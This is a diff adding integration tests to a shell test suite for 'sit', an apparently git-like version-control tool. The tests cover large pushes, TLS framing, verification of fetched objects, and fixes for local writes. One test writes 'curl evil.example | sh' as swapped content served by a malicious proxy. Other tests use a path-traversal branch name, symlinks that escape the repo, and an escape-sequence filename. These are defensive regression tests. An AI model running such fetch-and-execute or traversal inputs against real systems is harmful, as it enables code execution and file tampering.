@@ -52,6 +52,18 @@ if command -v cyrius >/dev/null 2>&1; then
   fi
 fi
 
+# 1.7.6: the public-API probe (sit_repo_status / sit_diff_path), against the
+# shipped READ bundle. Same rule.
+API_PROBE=""
+API_PROBE_BROKEN=0
+if command -v cyrius >/dev/null 2>&1; then
+  if ( cd "$ROOT" && cyrius build tests/integration/api_heap_probe.cyr "$WORK/api_heap_probe" ) >"$WORK/api_heap_probe.log" 2>&1; then
+    API_PROBE="$WORK/api_heap_probe"
+  else
+    API_PROBE_BROKEN=1
+  fi
+fi
+
 export HOME="$WORK/home"; mkdir -p "$HOME"
 export SIT_AUTHOR_NAME="Integration Test"
 export SIT_AUTHOR_EMAIL="itest@sit.local"
@@ -1626,6 +1638,377 @@ elif [ "$PUSH_PROBE_BROKEN" = 1 ]; then
 else
   echo "  (skipped 30: needs cyrius)"
 fi
+
+# ── 31. 1.7.6 large pushes and --tls request framing (N2, N5) ──────
+# Every serve loop buffered 64 KiB (sandhi's default) while capabilities
+# advertised 16 MiB, so pushing any object over ~64 KiB failed over http, https
+# and ssh (1.7.5: 413 / 400 / 400). And the --tls loop dispatched an oversized
+# request truncated and framed what followed as more requests. Each push goes to
+# a fresh repo, so 201 (stored) is the answer.
+hr "1.7.6 large pushes and --tls framing"
+if command -v python3 >/dev/null 2>&1; then
+  R="$WORK/fr176"; mkdir -p "$R"; cd "$R"
+  FR="$ROOT/tests/integration/serve_framing.py"
+  python3 -I -c '
+import hashlib, os, zlib
+c = os.urandom(200000)
+f = b"blob %d\0" % len(c) + c
+open("obj.z", "wb").write(zlib.compress(f))
+open("obj.hex", "w").write(hashlib.sha256(f).hexdigest())
+'
+  H=$(cat obj.hex)
+  for t in http https stdio; do mkdir -p "r$t"; (cd "r$t" && "$SIT" init >/dev/null); done
+  "$SIT" serve "$R/rhttp" --listen 127.0.0.1:18760 > /dev/null 2>&1 & FP1=$!
+  waitport 18760
+  assert_eq "$(python3 -I "$FR" push http 18760 obj.z "$H")" "push 201" "31a: a 200 KB object push over http is stored"
+  kill $FP1 2>/dev/null; wait $FP1 2>/dev/null
+  assert_eq "$(python3 -I "$FR" stdio "$SIT" "$R/rstdio" obj.z "$H")" "push 201" "31b: and over --stdio (the ssh transport)"
+  if command -v openssl >/dev/null 2>&1; then
+    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
+      -keyout k.pem -out c.pem -days 2 -nodes -subj "/CN=localhost" > /dev/null 2>&1
+    "$SIT" serve "$R/rhttps" --tls --cert c.pem --key k.pem --listen 127.0.0.1:18761 > /dev/null 2>&1 & FP2=$!
+    waitport 18761
+    assert_eq "$(python3 -I "$FR" push https 18761 obj.z "$H")" "push 201" "31c: and over --tls"
+    FOUT=$(timeout 60 python3 -I "$FR" frame https 18761)
+    assert_contains "$FOUT" "toolarge 413" "31d: --tls answers 413 to a body past the limit, not a truncated dispatch"
+    assert_contains "$FOUT" "clte 400" "31d: and 400 to Content-Length with Transfer-Encoding"
+    assert_contains "$FOUT" "chunked 501" "31d: and 501 to a chunked body"
+    assert_contains "$FOUT" "pipelined 1 " "31d: and answers one of two pipelined requests, then closes"
+    # 31e (N3): a pin file that exists but cannot be read is not "no pins" —
+    # 1.7.5 then pinned whatever certificate the next connection presented.
+    if [ "$(id -u)" != "0" ]; then
+      mkdir -p "$R/tofu" && (cd "$R/tofu" && "$SIT" init >/dev/null && "$SIT" remote add o https://127.0.0.1:18761 >/dev/null)
+      (cd "$R/tofu" && "$SIT" fetch o main >/dev/null 2>&1)
+      if [ -f "$HOME/.sit/known_certs" ]; then
+        chmod 000 "$HOME/.sit/known_certs"
+        TOUT=$(cd "$R/tofu" && "$SIT" fetch o main 2>&1); TRC=$?
+        chmod 600 "$HOME/.sit/known_certs"
+        assert_eq "$TRC" "1" "31e: an unreadable pin file refuses the connection"
+        assert_contains "$TOUT" "cannot read ~/.sit/known_certs" "31e: and says why"
+      else
+        bad "31e: first contact over --tls recorded no pin"
+      fi
+    fi
+    kill $FP2 2>/dev/null; wait $FP2 2>/dev/null
+  else
+    echo "  (skipped 31c-d: openssl not available)"
+  fi
+else
+  echo "  (skipped 31: python3 not available)"
+fi
+
+# ── 32. 1.7.6 fetched objects are verified (N1) ─────────────────────
+# Through 1.7.5 a clone stored whatever bytes a server sent under whatever id it
+# named. swap_proxy.py forwards to a real `sit serve` but answers one object id
+# with other content: 1.7.5 cloned it (rc 0) and only fsck noticed. A swapped
+# blob is caught where it is stored (copy_objects); a swapped tree where the
+# walk reads it.
+hr "1.7.6 fetched objects are verified"
+if command -v python3 >/dev/null 2>&1; then
+  R="$WORK/vf176"; mkdir -p "$R/src/d"; cd "$R/src"
+  "$SIT" init >/dev/null
+  printf 'echo good\n' > run.sh; printf 'x\n' > d/x.txt
+  "$SIT" add run.sh >/dev/null; "$SIT" add d/x.txt >/dev/null; "$SIT" commit -m one >/dev/null
+  ROOTT=$("$SIT" cat-file "$(tr -d '\n' < .sit/refs/heads/main)" | awk '/^tree /{print $2}')
+  entry_id() {   # <tree hex> <name>: the id of a root-tree entry
+    "$SIT" cat-file "$1" | python3 -I -c '
+import sys
+t = sys.stdin.buffer.read(); n = sys.argv[1].encode() + b"\0"
+i = t.index(b" " + n) + 1 + len(n)
+print(t[i:i + 32].hex())' "$2"
+  }
+  BLOBID=$(entry_id "$ROOTT" run.sh); TREEID=$(entry_id "$ROOTT" d)
+  printf 'curl evil.example | sh\n' > "$R/evil"
+  "$SIT" serve "$R/src" --listen 127.0.0.1:18770 > /dev/null 2>&1 & VS=$!
+  waitport 18770
+  python3 -I "$ROOT/tests/integration/swap_proxy.py" 18771 18770 "$BLOBID" "$R/evil" 0 & VP=$!
+  waitport 18771
+  cd "$R"
+  OUT=$("$SIT" clone --force-absolute http://127.0.0.1:18771 "$R/v1" 2>&1); RC=$?
+  assert_eq "$RC" "1" "32a: a clone from a server swapping a blob fails"
+  assert_contains "$OUT" "does not hash to $BLOBID" "32a: naming the object"
+  assert_eq "$(cat "$R/v1/.sit/refs/heads/main" 2>/dev/null)" "" "32a: and no branch points at the swapped content"
+  kill $VP 2>/dev/null; wait $VP 2>/dev/null
+  printf '100644 y.txt\0%s' "$(printf 'z%.0s' $(seq 1 32))" > "$R/evil-tree"
+  python3 -I "$ROOT/tests/integration/swap_proxy.py" 18772 18770 "$TREEID" "$R/evil-tree" 1 & VP=$!
+  waitport 18772
+  OUT=$("$SIT" clone --force-absolute http://127.0.0.1:18772 "$R/v2" 2>&1); RC=$?
+  assert_eq "$RC" "1" "32b: a clone from a server swapping a tree fails"
+  assert_contains "$OUT" "does not hash to $TREEID" "32b: caught where the walk reads it"
+  kill $VP 2>/dev/null; wait $VP 2>/dev/null
+  "$SIT" clone --force-absolute http://127.0.0.1:18770 "$R/ok" > /dev/null 2>&1
+  assert_eq "$(cat "$R/ok/run.sh" 2>/dev/null)" "echo good" "32c: the honest server still clones"
+  kill $VS 2>/dev/null; wait $VS 2>/dev/null
+else
+  echo "  (skipped 32: python3 not available)"
+fi
+
+# ── 33. 1.7.6 local-write fixes (L1–L18) ───────────────────────────
+# Each case failed on 1.7.5 — an edit, an untracked file or a commit's change
+# lost with rc 0, or a command that did something other than what it said.
+hr "1.7.6 local-write fixes"
+R="$WORK/lw176"; mkdir -p "$R"; cd "$R"
+c() { "$SIT" add "$1" >/dev/null; }
+
+# L1: octopus merge refuses a dirty tree instead of overwriting the edit.
+mkdir l1 && cd l1 && "$SIT" init >/dev/null
+echo base > a.txt; c a.txt; "$SIT" commit -m base >/dev/null
+"$SIT" branch b1 >/dev/null; "$SIT" branch b2 >/dev/null
+"$SIT" checkout b1 >/dev/null; echo one > one.txt; c one.txt; "$SIT" commit -m one >/dev/null
+"$SIT" checkout b2 >/dev/null; echo two > two.txt; c two.txt; "$SIT" commit -m two >/dev/null
+"$SIT" checkout main >/dev/null; echo "PRECIOUS" > a.txt
+"$SIT" merge b1 b2 >/dev/null 2>&1; assert_eq "$?" "1" "L1: octopus merge refuses a dirty tree"
+assert_eq "$(cat a.txt)" "PRECIOUS" "L1: and the uncommitted edit is intact"
+cd "$R"
+
+# L2: reset --hard clears an abandoned merge; checkout refuses mid-merge.
+mkdir l2 && cd l2 && "$SIT" init >/dev/null
+printf 'a\nb\nc\n' > f.txt; c f.txt; "$SIT" commit -m base >/dev/null; "$SIT" branch feat >/dev/null
+printf 'a\nMAIN\nc\n' > f.txt; c f.txt; "$SIT" commit -m m >/dev/null
+"$SIT" checkout feat >/dev/null; printf 'a\nFEAT\nc\n' > f.txt; c f.txt; "$SIT" commit -m f >/dev/null
+"$SIT" checkout main >/dev/null; "$SIT" merge feat >/dev/null 2>&1
+"$SIT" checkout feat >/dev/null 2>&1; assert_eq "$?" "1" "L2: checkout refuses while a merge is in progress"
+"$SIT" reset --hard HEAD >/dev/null 2>&1
+[ -e .sit/MERGE_HEAD ] && bad "L2: reset --hard left MERGE_HEAD" || ok
+echo u > u.txt; c u.txt; "$SIT" commit -m after >/dev/null
+assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent ')" "1" "L2: the next commit is not a merge"
+cd "$R"
+
+# L3: a conflicted merge refuses to write over an untracked file at a conflict path.
+mkdir l3 && cd l3 && "$SIT" init >/dev/null
+echo v1 > p.txt; echo k > k.txt; c p.txt; c k.txt; "$SIT" commit -m base >/dev/null; "$SIT" branch feat >/dev/null
+"$SIT" rm p.txt >/dev/null; "$SIT" commit -m del >/dev/null
+"$SIT" checkout feat >/dev/null; echo v2 > p.txt; c p.txt; "$SIT" commit -m mod >/dev/null
+"$SIT" checkout main >/dev/null; echo "NOTES" > p.txt
+"$SIT" merge feat >/dev/null 2>&1
+assert_eq "$(cat p.txt)" "NOTES" "L3: an untracked file at a conflict path survives the merge"
+cd "$R"
+
+# L4: sit rm refuses a file with unstaged edits (--cached still works).
+mkdir l4 && cd l4 && "$SIT" init >/dev/null
+echo v1 > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; echo "UNSAVED" >> a.txt
+"$SIT" rm a.txt >/dev/null 2>&1; assert_eq "$?" "1" "L4: rm refuses a changed file"
+assert_contains "$(cat a.txt)" "UNSAVED" "L4: and the edit is still there"
+cd "$R"
+
+# L5: a ref that is not a commit id is an error, not "no commits yet".
+mkdir l5 && cd l5 && "$SIT" init >/dev/null
+for i in 1 2; do echo $i > f$i.txt; c f$i.txt; "$SIT" commit -m c$i >/dev/null; done
+: > .sit/refs/heads/main; echo x > n.txt; c n.txt
+"$SIT" commit -m after >/dev/null 2>&1; assert_eq "$?" "1" "L5: commit refuses over a broken branch ref"
+cd "$R"
+
+# L6: stash refuses when a file HEAD tracks but the index does not has changed.
+mkdir l6 && cd l6 && "$SIT" init >/dev/null
+echo v1 > a.txt; echo k > k.txt; c a.txt; c k.txt; "$SIT" commit -m b >/dev/null
+"$SIT" rm --cached a.txt >/dev/null; echo "UNTRACKED WORK" > a.txt; echo e >> k.txt
+"$SIT" stash >/dev/null 2>&1; assert_eq "$?" "1" "L6: stash refuses"
+assert_eq "$(cat a.txt)" "UNTRACKED WORK" "L6: and the unstaged file keeps its content"
+cd "$R"
+
+# L7: rebase --continue after a non-conflict stop re-applies the step.
+mkdir l7 && cd l7 && "$SIT" init >/dev/null
+printf 'l1\nl2\n' > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
+printf 'l1\nl2\nIMPORTANT\n' > a.txt; c a.txt; echo s > tmp.txt; c tmp.txt; "$SIT" commit -m X >/dev/null
+"$SIT" rm tmp.txt >/dev/null; "$SIT" commit -m Y >/dev/null
+"$SIT" checkout main >/dev/null; echo u > u.txt; c u.txt; "$SIT" commit -m U >/dev/null; "$SIT" checkout feature >/dev/null
+echo notes > tmp.txt; "$SIT" rebase main >/dev/null 2>&1; mv tmp.txt ../l7-notes
+"$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "0" "L7: --continue completes"
+assert_contains "$(cat a.txt)" "IMPORTANT" "L7: and the stopped commit's change is applied"
+cd "$R"
+# L7b: a step that got as far as its tree but whose ref write failed is
+# committed by --continue, not re-applied over the now-changed tree forever.
+if [ "$(id -u)" != "0" ]; then
+  mkdir l7b && cd l7b && "$SIT" init >/dev/null
+  printf 'a\nb\nc\n' > f.txt; c f.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
+  printf 'a\nFEAT\nc\n' > f.txt; c f.txt; "$SIT" commit -m X >/dev/null; echo y > y.txt; c y.txt; "$SIT" commit -m Y >/dev/null
+  "$SIT" checkout main >/dev/null; printf 'a\nMAIN\nc\n' > f.txt; c f.txt; "$SIT" commit -m M >/dev/null
+  "$SIT" checkout feature >/dev/null; "$SIT" rebase main >/dev/null 2>&1
+  printf 'a\nRESOLVED\nc\n' > f.txt; c f.txt; "$SIT" commit -m "X resolved" >/dev/null
+  chmod a-w .sit/refs/heads; "$SIT" rebase --continue >/dev/null 2>&1; chmod u+w .sit/refs/heads
+  "$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "0" "L7b: --continue after a failed ref write completes"
+  assert_contains "$("$SIT" log --oneline | head -1)" "Y" "L7b: and records the step"
+  cd "$R"
+fi
+
+# L8: a commit whose subtree is missing is refused, not read as an empty
+# directory (1.7.5 checked out top.txt alone, deleted d/, and said "clean").
+if command -v python3 >/dev/null 2>&1; then
+  mkdir -p l8/a l8/b && cd l8/a && "$SIT" init >/dev/null
+  mkdir d; echo f > d/f.txt; echo t > top.txt; c d/f.txt; c top.txt; "$SIT" commit -m a >/dev/null
+  CA=$(tr -d '\n' < .sit/refs/heads/main); TA=$("$SIT" cat-file "$CA" | awk '/^tree /{print $2}')
+  TOPB=$("$SIT" cat-file "$TA" | python3 -I -c '
+import sys
+t = sys.stdin.buffer.read(); n = b"top.txt\0"; i = t.index(b" " + n) + 1 + len(n)
+print(t[i:i + 32].hex())')
+  cd "$R/l8/b" && "$SIT" init >/dev/null
+  mkdir d; echo mine > d/f.txt; echo keep > d/keep.txt; echo t > top.txt
+  c d/f.txt; c d/keep.txt; c top.txt; "$SIT" commit -m b >/dev/null
+  for o in "$CA" "$TA" "$TOPB"; do
+    ( cd "$R/l8/a" && "$SIT" cat-file "$o" ) > "$R/l8/obj"
+    python3 -I -c '
+import hashlib, os, sys, zlib
+h, src = sys.argv[1], sys.argv[2]; content = open(src, "rb").read()
+for t in (b"blob", b"tree", b"commit"):
+    full = t + b" " + str(len(content)).encode() + b"\0" + content
+    if hashlib.sha256(full).hexdigest() == h:
+        d = os.path.join(".sit", "objects", h[:2]); os.makedirs(d, exist_ok=True)
+        open(os.path.join(d, h[2:]), "wb").write(zlib.compress(full)); break' "$o" "$R/l8/obj"
+  done
+  printf '%s\n' "$CA" > .sit/refs/heads/broken
+  "$SIT" checkout broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: checkout of a commit with a missing subtree refuses"
+  [ -f d/keep.txt ] && ok || bad "L8: and d/ is left as it was"
+  "$SIT" reset --hard broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: reset --hard refuses it too"
+  "$SIT" merge broken >/dev/null 2>&1; [ "$?" != "0" ] && ok || bad "L8: merge of it must not succeed"
+  "$SIT" show broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: show refuses it instead of listing files as deleted"
+  cd "$R"
+fi
+
+# L9 is covered by the unit suite (hunks_overlap / three_way_line_merge).
+
+# L10: re-running init keeps HEAD on its branch.
+mkdir l10 && cd l10 && "$SIT" init >/dev/null
+echo a > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
+"$SIT" init >/dev/null; assert_eq "$(cat .sit/HEAD)" "ref: refs/heads/feature" "L10: reinit leaves HEAD alone"
+cd "$R"
+
+# L11 / X1 / X3: file:// push validates the branch and never writes through a symlink.
+mkdir -p l11/remote l11/local l11/victim
+( cd l11/remote && "$SIT" init >/dev/null )
+cd l11/local && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m c >/dev/null
+"$SIT" remote add origin "file://$R/l11/remote" >/dev/null
+echo precious > "$R/l11/victim/notes.txt"
+"$SIT" push origin ../../../../victim/notes.txt >/dev/null 2>&1; assert_eq "$?" "1" "L11: push refuses a traversal branch name"
+assert_eq "$(cat "$R/l11/victim/notes.txt")" "precious" "L11: and writes nothing outside the remote"
+ln -s "$R/l11/victim/o.txt" "$R/l11/remote/.sit/refs/heads/topic"; echo keep > "$R/l11/victim/o.txt"
+"$SIT" checkout -b topic >/dev/null
+"$SIT" push origin topic >/dev/null 2>&1; assert_eq "$?" "1" "L11: push refuses a symlinked remote ref"
+assert_eq "$(cat "$R/l11/victim/o.txt")" "keep" "L11: and does not write through it"
+cd "$R"
+
+# L12 / L13: index writes are one transaction — a refused write is reported,
+# and `sit mv` puts the file back when the index cannot follow it.
+mkdir l12 && cd l12 && "$SIT" init >/dev/null
+for i in $(seq 40); do echo f$i > f$i.txt; c f$i.txt; done; "$SIT" commit -m b >/dev/null
+if command -v python3 >/dev/null 2>&1; then
+  fsz() { python3 -I -c '
+import resource, signal, subprocess, sys
+lim = int(sys.argv[1])
+def pre():
+    signal.signal(signal.SIGXFSZ, signal.SIG_IGN)
+    resource.setrlimit(resource.RLIMIT_FSIZE, (lim, lim))
+sys.exit(subprocess.run(sys.argv[2:], preexec_fn=pre, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode)' "$@"; }
+  echo f1 > copy.txt
+  fsz 4096 "$SIT" add copy.txt; assert_eq "$?" "1" "L12: add reports a refused index write"
+  fsz 4096 "$SIT" mv f2.txt moved.txt; assert_eq "$?" "1" "L13: mv reports a refused index write"
+  [ -f f2.txt ] && [ ! -e moved.txt ] && ok || bad "L13: and the file is moved back"
+fi
+"$SIT" mv f3.txt "d/$(printf 'x%.0s' $(seq 200))/$(printf 'y%.0s' $(seq 60))" >/dev/null 2>&1
+assert_eq "$?" "1" "L13: mv refuses a destination past the index path limit"
+[ -f f3.txt ] && ok || bad "L13: and leaves the source in place"
+cd "$R"
+
+# L14: add refuses a path beyond a symlink, and a symlink itself.
+mkdir -p l14/outside && echo SECRET > l14/outside/s.txt && mkdir l14/r && cd l14/r && "$SIT" init >/dev/null
+ln -s "$R/l14/outside" linkdir; ln -s "$R/l14/outside/s.txt" link.txt
+"$SIT" add linkdir/s.txt >/dev/null 2>&1; assert_eq "$?" "1" "L14: add refuses a path beyond a symlink"
+"$SIT" add link.txt >/dev/null 2>&1; assert_eq "$?" "1" "L14: add refuses a symlink"
+cd "$R"
+
+# L15: config set on an unreadable config refuses instead of replacing it.
+if [ "$(id -u)" != "0" ]; then
+  mkdir l15 && cd l15 && "$SIT" init >/dev/null && "$SIT" remote add origin file:///x >/dev/null
+  chmod 000 .sit/config; "$SIT" config user.email a@b >/dev/null 2>&1; RC=$?; chmod 600 .sit/config
+  assert_eq "$RC" "1" "L15: config set refuses an unreadable config"
+  assert_contains "$(cat .sit/config)" "remote.origin.url" "L15: and the config is intact"
+  # The atomic replace keeps the replaced file's mode: a 0600 config stays 0600.
+  chmod 600 "$HOME/.sitconfig" 2>/dev/null || { "$SIT" config --global a.b c >/dev/null; chmod 600 "$HOME/.sitconfig"; }
+  "$SIT" config --global user.email a@b >/dev/null
+  assert_eq "$(stat -c %a "$HOME/.sitconfig")" "600" "L15: config --global keeps a 0600 ~/.sitconfig at 0600"
+  cd "$R"
+fi
+
+# L16: status prints worktree names display-safe.
+mkdir l16 && cd l16 && "$SIT" init >/dev/null
+touch "$(printf 'evil\033]0;PWNED\007.txt')"
+case "$("$SIT" status)" in *"$(printf '\033')"*) bad "L16: status printed a raw ESC";; *) ok;; esac
+cd "$R"
+
+# L17: options are not taken as names or messages; merge honours -S anywhere.
+mkdir l17 && cd l17 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m b >/dev/null
+"$SIT" branch -D x >/dev/null 2>&1; assert_eq "$?" "1" "L17: branch -D is not a branch name"
+[ -e .sit/refs/heads/-D ] && bad "L17: a branch named -D was created" || ok
+"$SIT" tag -f v1 >/dev/null 2>&1; assert_eq "$?" "1" "L17: tag -f is not a tag name"
+"$SIT" commit --amend >/dev/null 2>&1; assert_eq "$?" "1" "L17: commit --amend is not a message"
+"$SIT" branch f2 >/dev/null; "$SIT" merge f2 -q >/dev/null 2>&1; assert_eq "$?" "1" "L17: merge refuses an unknown trailing option"
+cd "$R"
+
+# L18: an empty tree can be built (revert of a root commit).
+mkdir l18 && cd l18 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m base >/dev/null
+"$SIT" revert HEAD >/dev/null 2>&1; assert_eq "$?" "0" "L18: revert of a root commit succeeds"
+[ -e a ] && bad "L18: and removes the file" || ok
+cd "$R"
+
+# R12: a commit with two tree headers is refused everywhere, and fsck calls it bad.
+mkdir r12 && cd r12 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m one >/dev/null
+P=$(tr -d '\n' < .sit/refs/heads/main); T=$("$SIT" cat-file "$P" | awk '/^tree /{print $2}')
+if command -v python3 >/dev/null 2>&1; then
+  C=$(python3 -I -c '
+import hashlib, os, sys, zlib
+t, p = sys.argv[1], sys.argv[2]
+body = ("tree %s\ntree %s\nparent %s\nauthor x <x@x> 1 +0000\ncommitter x <x@x> 1 +0000\n\nm\n" % (t, t, p)).encode()
+f = b"commit %d\0" % len(body) + body; o = hashlib.sha256(f).hexdigest()
+d = os.path.join(".sit", "objects", o[:2]); os.makedirs(d, exist_ok=True)
+open(os.path.join(d, o[2:]), "wb").write(zlib.compress(f)); print(o)' "$T" "$P")
+  printf '%s\n' "$C" > .sit/refs/heads/evil
+  "$SIT" checkout evil >/dev/null 2>&1; assert_eq "$?" "1" "R12: checkout refuses a two-tree commit"
+  assert_contains "$("$SIT" fsck 2>&1)" "malformed commit $C" "R12: fsck reports it"
+  "$SIT" fsck --prune-now >/dev/null 2>&1; assert_eq "$?" "1" "R12: and --prune refuses while it is there"
+fi
+cd "$R"
+
+# R11: a FIFO where a repo file is expected reads as absent instead of hanging.
+mkdir r11 && cd r11 && "$SIT" init >/dev/null
+mkfifo .sit/config
+timeout 10 "$SIT" config user.name >/dev/null 2>&1; RC=$?
+[ "$RC" != "124" ] && ok || bad "R11: a FIFO .sit/config hung the reader"
+rm -f .sit/config; mkfifo f.txt
+timeout 10 "$SIT" add f.txt >/dev/null 2>&1; RC=$?
+[ "$RC" = "1" ] && ok || bad "R11: add of a FIFO should refuse (rc $RC)"
+cd "$R"
+
+# ── 34. 1.7.6 read path: what the API keeps, reflog cost (R1 / R7 / R9) ──
+# 1.7.5's sit_repo_status kept every blob and worktree file it compared — 10 MB
+# per call on 200 files of 50 KB, ~200 MB of resident growth over 10 calls in
+# owl / thoth — and sit_diff_path diffed an unchanged file instead of returning
+# 0. A 5,000-entry reflog took 11 s to fsck (each line found by a rescan).
+hr "1.7.6 read path"
+if [ -n "$API_PROBE" ] && command -v git >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
+  R="$WORK/api176"; mkdir -p "$R"; cd "$R"
+  git init -q . && python3 -I -c '
+import random
+r = random.Random(1)
+for i in range(200):
+    open("f%03d.txt" % i, "w").write("".join(chr(97 + r.randrange(26)) for _ in range(50000)) + "\n")'
+  git add . && git -c user.name=t -c user.email=t@t commit -qm c && git gc -q
+  read -r _ SB SR <<< "$("$API_PROBE" f001.txt 10 | grep '^STATUS')"
+  read -r _ DB DR DZ <<< "$("$API_PROBE" f001.txt 10 | grep '^DIFF')"
+  [ "${SR:-99999}" -lt 8192 ] 2>/dev/null && ok || bad "R1: 10 sit_repo_status calls grew RSS by ${SR:-?} KB (bound 8192; 1.7.5 ~202000)"
+  [ "${SB:-99999999}" -lt 1048576 ] 2>/dev/null && ok || bad "R1: sit_repo_status kept ${SB:-?} B per call (bound 1 MiB; 1.7.5 ~10 MB)"
+  assert_eq "${DZ:-none}" "1" "R9: sit_diff_path of an unchanged file returns 0"
+  [ "${DR:-99999}" -lt 4096 ] 2>/dev/null && ok || bad "R9: 10 sit_diff_path calls grew RSS by ${DR:-?} KB (bound 4096)"
+elif [ "$API_PROBE_BROKEN" = 1 ]; then
+  bad "R1: tests/integration/api_heap_probe.cyr no longer compiles against dist/sit-read.cyr (see $WORK/api_heap_probe.log)"
+else
+  echo "  (skipped 34 API probe: cyrius, git or python3 not available)"
+fi
+R="$WORK/rl176"; mkdir -p "$R"; cd "$R"
+"$SIT" init >/dev/null; echo a > a; "$SIT" add a >/dev/null; "$SIT" commit -m c >/dev/null
+L=$(head -1 .sit/logs/HEAD); : > .sit/logs/HEAD
+for _ in $(seq 20000); do printf '%s\n' "$L"; done > .sit/logs/HEAD
+T0=$(date +%s); "$SIT" fsck >/dev/null 2>&1; FRC=$?; "$SIT" reflog -n 3 >/dev/null 2>&1; T1=$(date +%s)
+assert_eq "$FRC" "0" "R7: fsck over a 20,000-entry reflog succeeds"
+[ $((T1 - T0)) -lt 10 ] && ok || bad "R7: fsck + reflog over 20,000 entries took $((T1 - T0)) s (1.7.5: minutes)"
 
 # ── summary ────────────────────────────────────────────────────────
 printf '\n=== integration: %d passed, %d failed ===\n' "$PASS" "$FAIL"
